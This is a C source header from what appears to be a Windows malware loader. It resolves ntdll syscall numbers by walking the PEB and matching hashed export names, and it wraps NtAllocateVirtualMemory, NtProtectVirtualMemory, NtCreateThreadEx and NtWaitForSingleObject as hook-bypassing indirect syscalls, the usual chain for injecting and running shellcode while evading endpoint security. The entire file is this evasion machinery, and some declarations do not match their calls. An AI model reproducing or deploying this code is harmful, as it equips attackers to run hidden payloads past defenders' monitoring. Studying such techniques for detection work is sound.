#pragma once

#include "api.h"
#include "gate.h"

#include <Windows.h>

#define DEBUG

#ifdef DEBUG
#include <stdio.h>
#endif


static SYSCALL_INFO_TABLE SyscallInfoTable;


extern VOID SyscallPrepare(WORD wSsn);
extern SyscallExec();


static BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	PIMAGE_DOS_HEADER pImageDosHeader;
	PIMAGE_NT_HEADERS pImageNtHeaders;

	pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;

	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);

	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(
		(PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress
		);

	return TRUE;
}


BOOL InitApi(VOID)
{
	PTEB pCurrentTeb;
	PPEB pCurrentPeb;

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

#ifdef DEBUG
	printf("0x%p = &SyscallInfoTable\n", &SyscallInfoTable);
#endif

#if _WIN64
	pCurrentTeb = (PTEB)__readgsqword(0x30);
#else
	pCurrentTeb = (PTEB)__readfsdword(0x16);
#endif

	pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;

	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0x0a)
		return FALSE;

	pImageExportDirectory = NULL;
	pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

#ifdef DEBUG
	printf("0x%p = pImageExportDirectory\n", pImageExportDirectory);
#endif

	if (InitSyscallInfo(&SyscallInfoTable.NtAllocateVirtualMemory, pLdrDataEntry->DllBase, pImageExportDirectory, 0xf5bd373480a6b89b) < 0)
		return FALSE;

#ifdef DEBUG
	printf(
		"\n"
		"0x%p = &SyscallInfoTable.NtAllocateVirtualMemory\n"
		"\t.dwSsn       = 0x%02x\n"
		"\t.pAddress    = 0x%p\n"
		"\t.pSyscallRet = 0x%p\n\n",
		&SyscallInfoTable.NtAllocateVirtualMemory, SyscallInfoTable.NtAllocateVirtualMemory.dwSsn,
		SyscallInfoTable.NtAllocateVirtualMemory.pAddress, SyscallInfoTable.NtAllocateVirtualMemory.pSyscallRet
	);
#endif

	if (InitSyscallInfo(&SyscallInfoTable.NtCreateThreadEx, pLdrDataEntry->DllBase, pImageExportDirectory, 0x64dc7db288c5015f) < 0)
		return FALSE;

#ifdef DEBUG
	printf(
		"\n"
		"0x%p = &SyscallInfoTable.NtCreateThreadEx\n"
		"\t.dwSsn       = 0x%02x\n"
		"\t.pAddress    = 0x%p\n"
		"\t.pSyscallRet = 0x%p\n\n",
		&SyscallInfoTable.NtCreateThreadEx, SyscallInfoTable.NtCreateThreadEx.dwSsn,
		SyscallInfoTable.NtCreateThreadEx.pAddress, SyscallInfoTable.NtCreateThreadEx.pSyscallRet
	);
#endif

	if (InitSyscallInfo(&SyscallInfoTable.NtProtectVirtualMemory, pLdrDataEntry->DllBase, pImageExportDirectory, 0x858bcb1046fb6a37) < 0)
		return FALSE;

#ifdef DEBUG
	printf(
		"\n"
		"0x%p = &SyscallInfoTable.NtProtectVirtualMemory\n"
		"\t.dwSsn       = 0x%02x\n"
		"\t.pAddress    = 0x%p\n"
		"\t.pSyscallRet = 0x%p\n\n",
		&SyscallInfoTable.NtProtectVirtualMemory, SyscallInfoTable.NtProtectVirtualMemory.dwSsn,
		SyscallInfoTable.NtProtectVirtualMemory.pAddress, SyscallInfoTable.NtProtectVirtualMemory.pSyscallRet
	);
#endif

	if (InitSyscallInfo(&SyscallInfoTable.NtWaitForSingleObject, pLdrDataEntry->DllBase, pImageExportDirectory, 0xc6a2fa174e551bcb) < 0)
		return FALSE;

#ifdef DEBUG
	printf(
		"\n"
		"0x%p = &SyscallInfoTable.NtWaitForSingleObject\n"
		"\t.dwSsn       = 0x%02x\n"
		"\t.pAddress    = 0x%p\n"
		"\t.pSyscallRet = 0x%p\n\n",
		&SyscallInfoTable.NtWaitForSingleObject, SyscallInfoTable.NtWaitForSingleObject.dwSsn,
		SyscallInfoTable.NtWaitForSingleObject.pAddress, SyscallInfoTable.NtWaitForSingleObject.pSyscallRet
	);
#endif

	return TRUE;
}

NTSTATUS NtAllocateVirtualMemory(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect)
{
	SyscallPrepare(SyscallInfoTable.NtAllocateVirtualMemory.dwSsn, SyscallInfoTable.NtAllocateVirtualMemory.pSyscallRet);
	return SyscallExec(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS NtProtectVirtualMemory(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _Inout_ PULONG NumberOfBytesToProtect, _In_ ULONG NewAccessProtection, _Out_ PULONG OldAccessProtection)
{
	SyscallPrepare(SyscallInfoTable.NtProtectVirtualMemory.dwSsn, SyscallInfoTable.NtProtectVirtualMemory.pSyscallRet);
	return SyscallExec(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}

NTSTATUS NtCreateThreadEx(_Out_ PHANDLE ThreadHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ProcessHandle, _In_ PVOID StartRoutine, _In_opt_ PVOID Argument, _In_ ULONG CreateFlags, _In_opt_ ULONG_PTR ZeroBits, _In_opt_ SIZE_T StackSize, _In_opt_ SIZE_T MaximumStackSize, _In_opt_ PVOID AttributeList)
{
	SyscallPrepare(SyscallInfoTable.NtCreateThreadEx.dwSsn, (PVOID)SyscallInfoTable.NtCreateThreadEx.pSyscallRet);
	return SyscallExec(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS NtWaitForSingleObject(_In_ HANDLE ObjectHandle, _In_ BOOLEAN Alertable OPTIONAL, _In_ PLARGE_INTEGER TimeOut)
{
	SyscallPrepare(SyscallInfoTable.NtWaitForSingleObject.dwSsn, (PVOID)SyscallInfoTable.NtWaitForSingleObject.pSyscallRet);
	return SyscallExec(ObjectHandle, Alertable, TimeOut);
}